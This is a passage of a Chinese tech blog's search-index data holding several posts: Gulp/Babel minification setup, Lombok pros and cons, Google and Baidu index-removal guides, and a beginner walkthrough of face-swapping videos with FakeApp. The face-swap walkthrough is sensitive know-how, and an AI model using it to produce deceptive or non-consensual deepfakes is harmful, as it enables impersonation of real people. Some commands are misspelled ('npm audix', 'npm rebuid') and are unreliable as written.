"96641-5333172926158-056", "qrcode": "https://www.techgrow.cn/img/wx_mp_qr.png", "keyword": "Tech", "random": "0.9", "height": "auto", "expires": "365", "lockToc": "yes", "interval": "30", "baseUrl": "" }); } catch(e) { console.warn("readmore plugin occurred error: " + e.name + " | " + e.message); } }',tags:"前端"},{title:"Hexo 优化 - 利用 Gulp 压缩代码",url:"/posts/17b9b7b0.html",text:"Gulp 压缩代码版本说明主要模块的版本号分别为： gulp 3.9.x，gulp-babel 7.x，babel-core 6.x 1234567891011121314151617\"babel-core\": \"^6.26.3\",\"babel-loader\": \"^7.1.5\",\"babel-preset-env\": \"^1.7.0\",\"babel-preset-es2015\": \"^6.24.1\",\"gulp\": \"^3.9.1\",\"gulp-babel\": \"^7.0.1\",\"gulp-cache\": \"^1.1.1\",\"gulp-changed\": \"^3.2.0\",\"gulp-clean\": \"^0.4.0\",\"gulp-debug\": \"^4.0.0\",\"gulp-htmlclean\": \"^2.7.22\",\"gulp-htmlmin\": \"^5.0.1\",\"gulp-imagemin\": \"^5.0.3\",\"gulp-minify-css\": \"^1.2.4\",\"gulp-uglify\": \"^3.0.2\",\"gulp-util\": \"^3.0.8\",\"imagemin-pngquant\": \"^7.0.0\" 安装 NPM 模块全局安装： 12345# 全局安装 Gulp 3.9$ npm install -g gulp@3.9.1# 全局查看 Gulp 的版本号$ gulp --version 局部安装： 123456789# 局部安装 Gulp 3.9.1$ npm install gulp@3.9.1# 局部安装 Babel 6$ npm install gulp-babel@7 babel-core babel-preset-env babel-loader babel-preset-es2015 --save# 局部安装其他模块1）将上面其他模块的依赖信息添加到博客根目录下的package.json文件中2）然后在博客的根目录下，执行局部安装命令：npm install 创建 Gulp 配置文件在 Hexo 博客的根目录下创建 gulpfile.js 配置文件，并写入以下内容： 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960var gulp = require('gulp');var gutil = require('gulp-util');var clean = require('gulp-clean');var debug = require('gulp-debug');var cache = require('gulp-cache');var babel = require('gulp-babel');var uglify = require('gulp-uglify');var changed = require('gulp-changed');var htmlmin = require('gulp-htmlmin');var imagemin = require('gulp-imagemin');var htmlclean = require('gulp-htmlclean');var minifycss = require('gulp-minify-css');var pngquant = require('imagemin-pngquant');// 压缩css文件gulp.task('minify-css', function() { return gulp.src('./public/css/**/*.css') .pipe(minifycss()) .pipe(gulp.dest('./public/css'));});// 压缩js文件，支持将ES6代码转换成ES5代码gulp.task('minify-js', function() { return gulp.src('./public/lib/**/*.js') .pipe(babel({ presets: ['es2015'] })) .pipe(uglify()) .pipe(gulp.dest('./public/lib'));});// 压缩html文件gulp.task('minify-html', function() { return gulp.src('./public/**/*.html') .pipe(htmlclean()) .pipe(htmlmin({ removeComments: true, minifyJS: true, minifyCSS: true, minifyURLs: true, })) .pipe(gulp.dest('./public'));});// 压缩图片(深度压缩)gulp.task('minify-images', function() { gulp.src('./public/asset/**/*.{png,jpg,gif,ico}') .pipe(cache(imagemin({ //启用缓存，只压缩发生变化的图片 progressive: true, //是否无损压缩jpg图片 interlaced: false, //是否隔行扫描gif进行渲染 svgoPlugins: [{removeViewBox: false}], //是否移除svg的viewbox属性 multipass: false, //是否多次优化svg直到完全优化 optimizationLevel: 5, //优化等级，取值范围：0-7，默认值：3 use: [pngquant()] //使用pngquant深度压缩png图片的imagemin插件 }))) .pipe(gulp.dest('./public/asset'));});// gulp3的写法gulp.task('default', ['minify-css', 'minify-js', 'minify-images', 'minify-html']); Gulp 执行压缩任务1234567891011121314151617181920# 进入博客根目录$ cd /blogroot# 执行指定的压缩任务（如压缩CSS）$ gulp minify-css# 执行全部压缩任务$ gulp[09:35:19] Using gulpfile /blogroot/gulpfile.js[09:35:19] Starting 'minify-css'...[09:35:19] Starting 'minify-js'...[09:35:19] Starting 'minify-images'...[09:35:19] Finished 'minify-images' after 6.59 ms[09:35:19] Starting 'minify-html'...[09:35:20] Finished 'minify-css' after 739 ms[09:35:27] Finished 'minify-js' after 7.78 s[09:40:51] Finished 'minify-html' after 5.52 min[09:40:51] Starting 'default'...[09:40:51] Finished 'default' after 34 μs[09:40:52] gulp-imagemin: Minified 122 images Gulp 使用优化Gulp 只压缩修改过的文件 上面的代码，默认会压缩扫描得到的所有文件（除了图片以外），效率和性能都非常低。此时可以安装 gulp-changed 模块，控制 Gulp 只压缩修改过的文件（代码如下）。 每次运行下面的代码之后，如果接着执行 hexo clean 命令，再执行压缩操作会发现 Gulp 依然会压缩所有文件。建议配合使用 gulp-cache 或者 gulp-cached 模块来解决压缩缓存的问题，也可以自行实现压缩缓存机制（内存缓存 + 磁盘缓存）。 如果压缩缓存方案依赖文件的 Hash 值，且 Hexo 使用了 Yilia 主题，则必须保证 Hexo 生成的标签（Tag）列表是有顺序的，否则 Hexo 每次执行 clean 与 generate 操作后，HTML 文件的 Hash 值都不一样，最终导致每次都会压缩 HTML 文件；建议修改 Hexo 主题的 JS 代码，使每次生成的标签列表都一样。 如果安装了第三方插件，可能也会影响文件的 Hash 值，例如：文章加密插件。 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576777879808182838485868788899091var gulp = require('gulp');var gutil = require('gulp-util');var clean = require('gulp-clean');var debug = require('gulp-debug');var cache = require('gulp-cache');var babel = require('gulp-babel');var uglify = require('gulp-uglify');var changed = require('gulp-changed');var htmlmin = require('gulp-htmlmin');var imagemin = require('gulp-imagemin');var htmlclean = require('gulp-htmlclean');var minifycss = require('gulp-minify-css');var pngquant = require('imagemin-pngquant');// 压缩css源文件(只压缩修改过的源文件)gulp.task('generate-minify-css', function() { return gulp.src('./public/css/**/*.css') .pipe(changed('/tmp/blog/css/', {extension:'.css', hasChanged: changed.compareContents})) .pipe(minifycss()) .pipe(gulp.dest('/tmp/blog/css/')) .pipe(debug({title: '压缩css源文件:'}));});// 拷贝经压缩的css源文件(只拷贝修改过的压缩源文件)gulp.task('copy-minify-css', ['generate-minify-css'], function() { return gulp.src('/tmp/blog/css/**/*.css') .pipe(changed('./public/css/', {extension:'.css', hasChanged: changed.compareContents})) .pipe(gulp.dest('./public/css/')) .pipe(debug({title: '拷贝经压缩的css源文件:'}));});// 压缩js源文件(只压缩修改过的源文件),支持将ES6代码转换成ES5代码gulp.task('generate-minify-js', function() { return gulp.src('./public/lib/**/*.js') .pipe(changed('/tmp/blog/lib/', {extension:'.js', hasChanged: changed.compareContents})) .pipe(babel({presets: ['es2015']})) .pipe(uglify()) .pipe(gulp.dest('/tmp/blog/lib/')) .pipe(debug({title: '压缩js源文件:'}));});// 拷贝经压缩的js源文件(只拷贝修改过的压缩源文件)gulp.task('copy-minify-js', ['generate-minify-js'], function() { return gulp.src('/tmp/blog/lib/**/*.js') .pipe(changed('./public/lib/', {extension:'.js', hasChanged: changed.compareContents})) .pipe(gulp.dest('./public/lib/')) .pipe(debug({title: '拷贝经压缩的js源文件:'}));});// 压缩html源文件(只压缩修改过的源文件)gulp.task('generate-minify-html', function() { return gulp.src('./public/**/*.html') .pipe(changed('/tmp/blog/', {extension:'.html', hasChanged: changed.compareContents})) .pipe(htmlclean()) .pipe(htmlmin({ removeComments: true, minifyJS: true, minifyCSS: true, minifyURLs: true, })) .pipe(gulp.dest('/tmp/blog/')) .pipe(debug({title: '压缩html源文件:'}));});// 拷贝经压缩的html源文件(只拷贝修改过的压缩源文件)gulp.task('copy-minify-html', ['generate-minify-html'], function() { return gulp.src('/tmp/blog/**/*.html') .pipe(changed('./public/', {extension:'.html', hasChanged: changed.compareContents})) .pipe(gulp.dest('./public/')) .pipe(debug({title: '拷贝经压缩的html源文件:'}));});// 压缩图片（深度压缩）gulp.task('minify-images', function() { gulp.src('./public/asset/**/*.{png,jpg,gif,ico}') .pipe(cache(imagemin({ //启用缓存，只压缩发生变化的图片 progressive: true, //是否无损压缩jpg图片 interlaced: false, //是否隔行扫描gif进行渲染 svgoPlugins: [{removeViewBox: false}], //是否移除svg的viewbox属性 multipass: false, //是否多次优化svg直到完全优化 optimizationLevel: 5, //优化等级，取值范围：0-7，默认值：3 use: [pngquant()] //使用pngquant深度压缩png图片的imagemin插件 }))) .pipe(gulp.dest('./public/asset')) .pipe(debug({title: '压缩图片:'}));});// gulp3的写法gulp.task('minify-js', ['generate-minify-js', 'copy-minify-js']);gulp.task('minify-css', ['generate-minify-css', 'copy-minify-css']);gulp.task('minify-html', ['generate-minify-html', 'copy-minify-html']); Gulp 直接调用 Hexo-Cli 命令如果需要 Gulp 直接调用 Hexo 的命令（hexo-cli），即执行 Hexo 的 clean、generate、server、deploy 等操作，可以参考以下代码： 12345678910111213141516171819202122232425262728293031323334353637383940414243444546var Hexo = require('hexo');var hexo = new Hexo(process.cwd(), {});gulp.task('hexo-clean', function() { return hexo.init().then(function() { return hexo.call('clean', { watch: false }).then(function() { return hexo.exit(); }).catch(function(err) { return hexo.exit(err); }); });});gulp.task('hexo-generate', function() { return hexo.init().then(function() { return hexo.call('generate', { watch: false }).then(function() { return hexo.exit(); }).catch(function(err) { return hexo.exit(err); }); });});gulp.task('hexo-server', function() { return hexo.init().then(function() { return hexo.call('server', {}); }).catch(function(err) { console.log(err); });});gulp.task('hexo-deploy', function() { return hexo.init().then(function() { return hexo.call('deploy', { watch: false }).then(function() { return hexo.exit(); }).catch(function(err) { return hexo.exit(err); }); });}); 显示 Gulp 的详细构建日志信息为了方便调试 Gulp 的构建，可以安装 gulp-debug 模块，然后添加 JS 代码将构建日志信息打印出来，示例代码如下： 1234567891011var debug = require('gulp-debug');gulp.task('minify-js', function() { return gulp.src('./lib/*.js') .pipe(babel({ presets: ['es2015'] })) .pipe(uglify()) .pipe(gulp.dest('./build')) .pipe(debug({title: '压缩js文件:'}));}); 显示 Gulp 构建失败时的错误日志信息默认情况下，如果 Gulp 执行构建任务出错，不一定都能显示详细的错误日志信息。为了方便定位问题，可以安装 gulp-util 模块，然后添加 JS 代码将错误日志信息打印出来，示例代码如下： 12345678910111213var gutil = require('gulp-util');gulp.task('minify-js', function() { return gulp.src('./lib/*.js') .pipe(babel({ presets: ['es2015'] })) .pipe(uglify()) .on('error', function(err) { gutil.log(gutil.colors.red('[Error]'), err.toString()); }) .pipe(gulp.dest('./build'));}); 升级 Gulp 的版本Gulp 版本升级将 Gulp 从版本 3.9.1 升级到 4.0.2，可以使用以下命令： 123# 全局安装版本检测、版本升级工具$ npm install -g npm-check$ npm install -g npm-upgrade 1234567891011121314151617181920# 进入博客的根目录$ cd /blog-root# 检测Hexo哪些模块可以升级$ npm-check# 删除package-lock.json# rm -rf package-lock.json# 更新package.json$ npm-upgrade# 更新Hexo的模块$ npm update --save# 若出现依赖的问题，用以下命令检查一下，然后把报错的统一修复一下即可$ npm audix# 或者强制更新$ npm update --save --force Babel 版本升级将 Babel 从版本 6 升级到 7，官方版本升级说明看这里。 12345# 卸载 Babel 6$ npm uninstall babel-core babel-loader babel-preset-env babel-preset-es2015 --save# 安装 Babel 7$ npm install gulp-babel @babel/core @babel/preset-env babel-preset-es2015 babel-core@6 --save 若 Gulp + Babel 执行文件压缩时，提示 [BABEL] Note: The code generator has deoptimised the styling of \"xxx/xxx.js\" as it exceeds the max of \"500KB\"，可以添加 compact\": false 参数来忽略该提示，示例代码如下： 123456789gulp.task('minify-js', function() { return gulp.src('./public/lib/**/*.js') .pipe(babel({ \"compact\": false, presets: ['es2015'] })) .pipe(uglify()) .pipe(gulp.dest('./public/lib'));}); Gulp 版本升级后的代码兼容处理当 Gulp 从版本 3 升级到 4 之后，执行 Gulp 命令时若出现 Gulp error: The following tasks did not complete: Did you forget to signal async completion? 错误，则需要参考以下方式更改代码。Gulp 4 最大的变化就是不能像以前那样传递一个依赖任务列表，即不能再用 Gulp3 的方式指定依赖任务，需要配合使用 gulp.series 和 gulp.parallel，因为 Gulp 任务现在只有两个参数。在 Gulp4 中必须明确通知 Gulp 任务已经完成，而在 Gulp3 中，通常不必要这么做，因为如果没有发出异步完成信号，那么当任务返回时，Gulp3 会认为它已经完成。通知 Gulp 任务已完成的另一个常见方法是 Return 一个流或者 Promise，异步任务还可以利用回调函数来通知 Gulp 任务已完成，相关资料可参考这里。下面是使用回调函数来通知 Gulp4 任务已完成的示例代码： 123456789gulp.task('generate-minify-css', gulp.series(function(cb){ // 异步操作 gulp.src('./public/css/**/*.css') .pipe(changed('/tmp/blog/css/', {extension:'.css', hasChanged: changed.compareContents})) .pipe(minifycss()) .pipe(gulp.dest('/tmp/blog/css/')) .pipe(debug({title: '压缩css源文件:'})); cb();})); Gulp 与 Babel 版本升级后的完整依赖项1234567891011121314151617\"@babel/core\": \"^7.14.8\",\"@babel/preset-env\": \"^7.14.9\",\"babel-core\": \"^6.26.3\",\"babel-preset-es2015\": \"^6.24.1\",\"gulp\": \"^4.0.2\",\"gulp-babel\": \"^7.0.1\",\"gulp-callback\": \"0.0.3\",\"gulp-changed\": \"^4.0.2\",\"gulp-clean\": \"^0.4.0\",\"gulp-debug\": \"^4.0.0\",\"gulp-htmlclean\": \"^2.7.22\",\"gulp-htmlmin\": \"^5.0.1\",\"gulp-imagemin\": \"^7.1.0\",\"gulp-minify-css\": \"^1.2.4\",\"gulp-uglify\": \"^3.0.2\",\"gulp-util\": \"^3.0.8\",\"imagemin-pngquant\": \"^9.0.2\", 常见问题压缩图片出错执行 gulp generate-minify-images 任务（压缩图片）时，终端输出如下的错误信息： 12345678[13:55:24] Finished 'generate-minify-images' after 1.2 s(node:3702) UnhandledPromiseRejectionWarning: Error: spawn /usr/local/hexo-blog/node_modules/mozjpeg/vendor/cjpeg ENOENT at Process.ChildProcess._handle.onexit (internal/child_process.js:269:19) at onErrorNT (internal/child_process.js:465:16) at processTicksAndRejections (internal/process/task_queues.js:80:21)(Use `node --trace-warnings ...` to show where the warning was created)(node:3702) UnhandledPromiseRejectionWarning: Unhandled promise rejection. This error originated either by throwing inside of an async function without a catch block, or by rejecting a promise which was not handled with .catch(). To terminate the node process on unhandled promise rejection, use the CLI flag `--unhandled-rejections=strict` (see https://nodejs.org/api/cli.html#cli_unhandled_rejections_mode). (rejection id: 2)(node:3702) [DEP0018] DeprecationWarning: Unhandled promise rejections are deprecated. In the future, promise rejections that are not handled will terminate the Node.js process with a non-zero exit code. 可以执行以下命令来解决，这里强烈建议在本地连接上 VPN 后，再执行 npm install 命令，这样可以确保所有下载的文件就都是完整的 1234567891011121314# 文件授权$ chmod 755 -R ~/.npm# 进入博客的根目录$ cd /blog-root# 删除所有模块文件$ rm -rf node_modules# 重建$ npm rebuid# 安装模块$ npm install var isMobile = navigator.userAgent.match(/(phone|pad|pod|iPhone|iPod|ios|iPad|Android|Mobile|BlackBerry|IEMobile|MQQBrowser|JUC|Fennec|wOSBrowser|BrowserNG|WebOS|Symbian|Windows Phone)/i); if (!isMobile) { try { var plugin = new ReadmorePlugin(); plugin.init({ \"type\": \"hexo\", \"id\": \"readmore-container\", \"name\": \"全栈技术驿站\", \"blogId\": \"96641-5333172926158-056\", \"qrcode\": \"https://www.techgrow.cn/img/wx_mp_qr.png\", \"keyword\": \"Tech\", \"random\": \"0.9\", \"height\": \"auto\", \"expires\": \"365\", \"lockToc\": \"yes\", \"interval\": \"30\", \"baseUrl\": \"\" }); } catch(e) { console.warn(\"readmore plugin occurred error: \" + e.name + \" | \" + e.message); } }",tags:"静态博客 前端"},{title:"Lombok 使用教程",url:"/posts/15ca8348.html",text:'项目中使用 Lombok 项目添加 Lombok 的 Maven 依赖： 123456&lt;dependency&gt; &lt;groupId&gt;org.projectlombok&lt;/groupId&gt; &lt;artifactId&gt;lombok&lt;/artifactId&gt; &lt;version&gt;1.18.12&lt;/version&gt; &lt;scope&gt;provided&lt;/scope&gt;&lt;/dependency&gt; IDEA 安装 Lombok 插件： IDEA 启用 Annocation Processors： 使用 Lombok 提供的注解： @Getter @Setter @ToString @EqualsAndHashCode @NonNull @NoArgsConstructor @RequiredArgsConstructor @AllArgsConstructor @Data @Builder @Log @Cleanup @SneakyThrows 使用 Lombok 的优点 减少代码维护：新增属性的时候，会减少非常多的代码维护工作 减少模板代码：Lombok 对大量的模板代码进行了封装，可以减少重复代码 使用 Lombok 的缺点 1) 侵入性太强：Lombok 的使用要求开发者一定要在 IDE 中安装对应的插件，如果项目组中使用了 Lombok，那么所有开发人员都必须安装 IDE 插件，否则就没办法协同开发。 2) 降低代码可读性：在项目中使用了 Lombok，确实可以帮忙减少很多代码，但是这些代码是要在编译阶段才会生成的，所以在开发的过程中，其实很多代码其实是缺失的。大量使用 Lombok，就导致代码的可读性降低，而且也会给代码调试带来一定的问题。比如，想要知道某个类中的某个属性的 Getter 方法都被哪些类引用的话，就没那么简单了。 3) 容易踩坑：在使用 Lombok 过程中，如果对于各种注解的底层原理不理解的话，很容易产生意想不到的结果。举一个简单的例子，当使用 @Data 定义一个类的时候，会自动帮我们生成 equals() 方法，但是如果只使用了 @Data，而不使用 @EqualsAndHashCode(callSuper=true) 的话，会默认是 @EqualsAndHashCode(callSuper=false)，这时候生成的 equals() 方法只会比较子类的属性，不会考虑从父类继承的属性，无论父类属性访问权限是否开放，这就可能得到意想不到的结果。 4) 影响升级：因为 Lombok 对于代码有很强的侵入性，这就可能带来一个比较大的问题，那就是会影响日后对 JDK 版本的升级。按照如今 JDK 的升级频率，每半年都会推出一个新的版本，但是 Lombok 作为一个第三方工具，并且是由开源团队维护的，那么 Lombok 的迭代速度是无法保证的。如果日后需要升级到某个新版本 JDK 的时候，若其中的特性在 Lombok 中不支持的话就会受到影响。还有一个可能带来的问题，就是 Lombok 自身的升级也会受到限制，因为一个应用可能依赖了多个 Jar 包，而每个 Jar 包可能又要依赖不同版本的 Lombok，这就导致在应用中需要做版本仲裁，而 Jar 包版本仲裁是没那么容易的，而且发生问题的概率也很高。 5) 破坏封装性：使用 Lombok 会破坏封装性，众所周知，Java 的三大特性包括封装性、继承性和多态性；如果在代码中直接使用 Lombok，那么会自动生成 Getter、Setter 等方法，这就意味着一个类中的所有参数都自动提供了设置和读取方法。 var isMobile = navigator.userAgent.match(/(phone|pad|pod|iPhone|iPod|ios|iPad|Android|Mobile|BlackBerry|IEMobile|MQQBrowser|JUC|Fennec|wOSBrowser|BrowserNG|WebOS|Symbian|Windows Phone)/i); if (!isMobile) { try { var plugin = new ReadmorePlugin(); plugin.init({ "type": "hexo", "id": "readmore-container", "name": "全栈技术驿站", "blogId": "96641-5333172926158-056", "qrcode": "https://www.techgrow.cn/img/wx_mp_qr.png", "keyword": "Tech", "random": "0.9", "height": "auto", "expires": "365", "lockToc": "yes", "interval": "30", "baseUrl": "" }); } catch(e) { console.warn("readmore plugin occurred error: " + e.name + " | " + e.message); } }',tags:"java"},{title:"人工智能视频换脸初级教程",url:"/posts/8f51ce11.html",text:'一些说明FBI WARING at 2019.02.06原文章写于 2018.02.20，将近于 1 年前，根据科技圈的进化规律，本文早已落伍。而且本文的本质是基于一款软件（fakeapp）写的教程，如果无法获取软件（因为官网早就挂了），那本文已无任何意义。不死心的可以试下磁力链接，在能下载到 fakeapp 的前提下，再阅读本文。本文的 fakeapp 是 2.0 的版本，其他版本自求多福。 环境配置，FakeApp (Windows 专用)官网下载或使用磁力链接 (官网已挂，磁力自求多福)，magnet:?xt=urn:btih:598F5888522C860D48629EB8EC267496B4322E70 GPU 加速 (强烈建议)N 卡建议 GTX1060 起，显存 2G 以上无 N 卡，可以使用 CPU， but very low如果有 N 卡，建议使用 GPU 计算，需要先安装 Nvidia CUDA , 建议安装 8.0 版本，下载地址 VC 库 (可选)附赠品，如果操作过程中报错了，可以选择安装 VC 库，下载地址 原理简介如何把 A 视频的脸，替换进 B 视频？主要分以下几步： 1. 收集 A,B 的脸因为是视频，所以要用一些特殊的技巧，把一个视频，转换成一张张图片，比如 10s 的视频，可能会有上百张图片，然后在上百张图片里，找出带有人脸的，最终都截取成相同大小的，比如 256*256 的脸图片 2. 训练模型，A-&gt;B有了 A 的 256*256 脸，和 B 的 256*256 脸，通过一些特殊的技巧，能找到两张脸之间联系，图片数越多，联系也就越紧，找到关系后，保存成 模型。这个模型的作用就是，给一张 A 的脸，输入进模型，模型会给出 B 的脸 3. 换脸随便找一个 A 的视频，依旧是转换成一张张图片，依旧要找出带有人脸的图片。把这一张张图片，丢进第 2 步得到的模型，就能得出一张张替换成 B 脸的图片。最后把所有的图片，再合并成视频，换脸完成 FakeApp 使用分三步，分别对应上面的三部曲 1.GetDataSet就一个参数，输入视频的路径。这里其实是要依次执行 2 个视频，一个 A 视频，一个 B 视频，比如 C:\\video\\a.mp4执行完毕后，会在 c:\\video 目录下，生成 dataset-a 目录dataset-a 目录，就是一张张图片 ，dataset-a 里面，还有个 extracted 目录extracted 目录，就是只保留人脸的图片，当然可能会有误差，因为是程序自动切的注意：要浏览 extracted 目录，只保留 256*256 的人脸图片，其他都删掉最终完成后，会有 dataset-a，dataset-b 两个目录，里面分别有 extracted 目录 第一步主要是从视频里取得人脸的样本集。 程序可能会报 Failed to execute script align_faces，这种情况可以尝试安装 VC 库，或者从其他途径获得人脸样本集，只要保证 2 张人脸的图片，大小一致 2.Train有三个参数： model 可以在 c:\\video 下，新建个目录叫 model，就是空的。那这个参数下就输入 c:\\video\\model，用来保存模型的结果 Data A, 对应了截取后的人脸目录，也就是 c:\\video\\dataset-a\\extracted Data B，同上，换上 b 的三个目录输入完后，点击 Train，开始漫长的等待，会有结果显示， Loss A，Loss B，一般小于 0.02，即可认为 OK，自主停掉程序 3.Created还是三个参数： model，同上，输入跑完的模型目录，依然是 c:\\video\\model 输入要换脸的视频，可以拿 a 视频做测试 c:\\video\\a.mp4 fps，30 or 24 ，没啥追求的就 24 吧跑完之后，就得到了换脸后的视频 总结 有个好显卡 两个视频的人物表情，角度尽量相似 相关开源项目 faceswap DeepFaceLab deepfakes_faceswap var isMobile = navigator.userAgent.match(/(phone|pad|pod|iPhone|iPod|ios|iPad|Android|Mobile|BlackBerry|IEMobile|MQQBrowser|JUC|Fennec|wOSBrowser|BrowserNG|WebOS|Symbian|Windows Phone)/i); if (!isMobile) { try { var plugin = new ReadmorePlugin(); plugin.init({ "type": "hexo", "id": "readmore-container", "name": "全栈技术驿站", "blogId": "96641-5333172926158-056", "qrcode": "https://www.techgrow.cn/img/wx_mp_qr.png", "keyword": "Tech", "random": "0.9", "height": "auto", "expires": "365", "lockToc": "yes", "interval": "30", "baseUrl": "" }); } catch(e) { console.warn("readmore plugin occurred error: " + e.name + " | " + e.message); } }',tags:"ai"},{title:"通过谷歌站长平台快速收录与删除网页",url:"/posts/fa4ebc1a.html",text:'清理垃圾或者无效的谷歌搜索记录 清理步骤如下： 为垃圾或者无效的搜索记录链接制作 301 跳转 在 robots.txt 中添加禁止收录或者无效的搜索记录的链接 重新生成新的站点地图文件，并提交到 Google 站长平台 删除谷歌搜索记录 由于上面的步骤做完还需要一段时间才能生效，而且每次使用谷歌搜索还是可以看到自己的网站挂着垃圾或无效链接，此时可以使用谷歌站长平台的 “移除网址” 功能来删除搜索记录。进到谷歌站长平台的操作后台，找到谷歌索引 -&gt; 移除网址。在谷歌搜索框中输入”site:xxx.com” 查看自己站点的收录结果，把不想被收录的 URL（不包含 http://域名，例如填写 /posts/6edb1958/ 即可）提交到移除网址里面，生效时间一般是 1-6 小时。 谷歌浏览器安装批量删除搜索记录的插件 如果垃圾或者无效的谷歌收录页面有上百个，要是一个个提交到移除网址里面，工作量非常大也不现实，此时可以使用浏览器插件批量删除搜索记录。下载浏览器插件，Chrome 安装插件需要开启开发模式，安装步骤如下： 从 Github 下载插件到本地并解压 浏览器打开链接 chrome://extensions/ ，启用开发者模式 选择” 加载已解压的扩展程序”，然后选择插件的解压目录 插件安装后，在谷歌站长平台的 “Remove URLs” 页面中，会发现多出 “选择文件” 的按钮，图片如下： 谷歌浏览器安装 SEOQUAKE 插件 由于批量删除搜索记录的插件需要 URL 数据文件，因此需要安装 SEOQUAKE 插件导出搜索记录中的所有链接。SEOQUAKE 插件的安装，可以在 Chrome 网上商店搜索”SEOQUAKE”，然后直接安装即可。在谷歌搜索框中输入”site:xxx.com” 查看自己站点的收录结果，然后点击 SEOQUAKE 插件的 ” 导出 CSV” 按钮直接导出 CSV 文件。SEOQUAKE 插件默认只导出单页面的所有搜索记录。 创建 URL 数据文件 将上面导出的 CSV 文件中的 URL 统一复制到单独的文件中（例如：google-remove-urls.txt），格式为每行都是单独的 URL 地址（不包含 http://域名），使用回车符 \\n 作为结束符。示例如下： 1234/posts/3cf5ae19//posts/1b3fbf25//posts/b31f4d18//posts/fcb4fc9d/index.html 通过批量删除搜索记录的插件提交 URL 数据文件 找到谷歌索引 -&gt; 移除网址，点击 “选择文件” 按钮，选择上面整理的 URL 数据文件，之后会看到浏览器页面反复自动刷新，页面中的删除列表也会自动添加 URL。 谷歌快速收录网页 找到抓取 -&gt; Google 抓取方式，填写希望被收录的 URL，然后点击 “Fetch AND RENDER” 按钮后会有弹窗，可以选择仅抓取此网址（每月限制提交 500 次）或者抓取此网址及其直接链接（每月限制提交 10 次）。如果填写的是 URL 目录，则需要以 / 结尾，否则谷歌会把不加 / 的网址判定 301 跳转。当 URL 提交之后，最后记得点击 “请求编入索引” 按钮。 相关站点 批量删除搜索记录的 Chrome 插件 操作 Google Webmaster 让网站快速收录与删除 var isMobile = navigator.userAgent.match(/(phone|pad|pod|iPhone|iPod|ios|iPad|Android|Mobile|BlackBerry|IEMobile|MQQBrowser|JUC|Fennec|wOSBrowser|BrowserNG|WebOS|Symbian|Windows Phone)/i); if (!isMobile) { try { var plugin = new ReadmorePlugin(); plugin.init({ "type": "hexo", "id": "readmore-container", "name": "全栈技术驿站", "blogId": "96641-5333172926158-056", "qrcode": "https://www.techgrow.cn/img/wx_mp_qr.png", "keyword": "Tech", "random": "0.9", "height": "auto", "expires": "365", "lockToc": "yes", "interval": "30", "baseUrl": "" }); } catch(e) { console.warn("readmore plugin occurred error: " + e.name + " | " + e.message); } }',tags:"爬虫"},{title:"删除百度搜索引擎收录的死链与无效快照",url:"/posts/1619dded.html",text:'百度站长死链提交工具介绍 死链提交工具生效时间为 3 天 死链提交有两种方式：文件提交、规则提交 死链提交工具仅识别 404 数据，请提交 404 数据；如误使用本工具，且站点内容不为死链，则提交不会生效 死链提交工具是网站向百度提交死链的数据推送工具，被推送死链将被百度搜索屏蔽。网站存在大量死链，将影响网站的站点评级 百度站长平台提交死链 注册百度站长平台帐号，然后登录进去找到” 数据引入” -&gt; “死链提交”。 文件提交方式 第一步，制作死链文件处理网站已存在的死链，并将这些死链页面设置成为 404 页面，即百度访问它们时返回 404 代码。将需要提交的死链列表制作成一个死链文件，制作方法与 sitemap 格式及制作方法一致。死链文件的格式为 txt 或者 xml，每个地址文件最多包含 50000 个网址且需小于 10MB，推荐使用 xml 格式。死链 xml 文件示例内容如下： 123456789101112131415&lt;?xml version="1.0" encoding="utf-8"?&gt;&lt;urlset xmlns="http://www.sitemaps.org/schemas/sitemap/0.9"&gt; &lt;url&gt; &lt;loc&gt;http://www.techgrow.online/posts/cd6beb9c/index.html&lt;/loc&gt; &lt;lastmod&gt;2019-02-26&lt;/lastmod&gt; &lt;changefreq&gt;daily&lt;/changefreq&gt; &lt;priority&gt;1.0&lt;/priority&gt; &lt;/url&gt; &lt;url&gt; &lt;loc&gt;http://www.techgrow.online/posts/67ba58dd/index.html&lt;/loc&gt; &lt;lastmod&gt;2019-02-26&lt;/lastmod&gt; &lt;changefreq&gt;daily&lt;/changefreq&gt; &lt;priority&gt;1.0&lt;/priority&gt; &lt;/url&gt;&lt;/urlset&gt; 第二步，将死链文件放置在网站根目录下比如您的网站为 example.com，您已制作了一个 silian_example.xml 死链文件，则将 silian_example.xml 上传至网站根目录即 example.com/silian_example.xml 第三步，提交死链文件 找到” 数据引入” -&gt; “死链提交” -&gt; “文件提交” 提交死链文件时，每次最多可提交 20 条死链文件地址 提交死链文件，填写死链文件地址（如： www.example.com/silian_example.xml ），选择更新时间，然后提交 第四步，管理已提交的死链文件提交完之后，可在数据反馈里看到已提交的死链文件，如果死链文件里面有新的死链，可以选择文件后，点击手动更新文件，即对更新的死链链接进行了提交。 规则提交方式 第一步找到” 数据引入” -&gt; “死链提交” -&gt; “规则提交” 第二步，提交死链规则填写死链规则，死链规则需要以 / 或？结尾。/ 结尾表示删除一个目录，例如：http://www.example.com/silian/ 包含 silian 目录下的所有链接。? 结尾表示 CGI 形式的通配链接，例如：http://www.example.com/silian? 包含长相为 silian?* 的所有链接。相同的死链规则一个月内只能提交一次。 第三步，管理已提交的死链规则死链规则提交完之后，同样可在数据反馈里看到已提交的死链规则，如果死链规则里面有新的死链，可以选择规则后，点击手动更新死链，即对更新的死链链接进行了提交。 删除百度搜索的快照 第一步，获取百度快照链接 第二步，提交需要删除的百度快照 / 索引链接打开百度服务中心的意见反馈页面，找到 “快照删除与更新”，然后填写百度快照 / 索引链接，最后点击 “提交” 按钮进行提交。 第三步，查看快照删除的处理进度找到百度服务中心页面的 “我的反馈”，点击进去可以在页面上看到快照删除与更新的处理进度。百度处理快照删除与更新的速度较慢，提交后一般需要 24 小时左右请求才会被处理。 死链 XML 文件格式详细说明 12345678910111213141516&lt;?xml version="1.0" encoding="utf-8"?&gt;&lt;!-- urlset，urlset 用来标记整个文档的开头，最少出现 1 次 最多出现 1 次 --&gt;&lt;urlset xmlns="http://www.sitemaps.org/schemas/sitemap/0.9"&gt; &lt;!-- url，url 标记每条信息的开始和结束，最少出现 0 次 最多出现 50000 次 --&gt; &lt;url&gt; &lt;!-- loc，该条数据的存放地址，最少出现 1 次 最多出现 1 次，类型为 URL 地址，最小长度 1 个字符 最大长度 256 个字符 必须符合正则表达式(http://)(.+) --&gt; &lt;loc&gt;http://www.techgrow.online/posts/cd6beb9c/&lt;/loc&gt; 